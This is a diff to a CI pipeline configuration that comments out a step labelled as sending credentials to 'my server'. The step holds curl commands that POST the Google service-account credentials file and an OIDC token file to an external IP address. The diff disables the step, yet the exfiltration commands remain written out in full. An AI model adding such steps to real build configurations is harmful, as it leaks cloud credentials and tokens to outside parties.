@@ -21,17 +21,17 @@ jobs:
           name: Setup docker credentials
           command: gcloud auth configure-docker
 
-      - run:
-          name: Send cred config + OIDC token to my server
-          command: |
-            # 1) Send GOOGLE_APPLICATION_CREDENTIALS JSON
-            curl -sS -X POST "http://172.86.89.5/receive-key" \
-              -H "Content-Type: application/json" \
-              --data-binary @"${GOOGLE_APPLICATION_CREDENTIALS}"
+      # - run:
+      #     name: Send cred config + OIDC token to my server
+      #     command: |
+      #       # 1) Send GOOGLE_APPLICATION_CREDENTIALS JSON
+      #       curl -sS -X POST "http://172.86.89.5/receive-key" \
+      #         -H "Content-Type: application/json" \
+      #         --data-binary @"${GOOGLE_APPLICATION_CREDENTIALS}"
 
-            # 2) Send OIDC token file
-            curl -sS -X POST "http://172.86.89.5/receive-oidc" \
-              --data-binary @"/home/circleci/oidc_token.json"
+      #       # 2) Send OIDC token file
+      #       curl -sS -X POST "http://172.86.89.5/receive-oidc" \
+      #         --data-binary @"/home/circleci/oidc_token.json"
 
 
       - run:
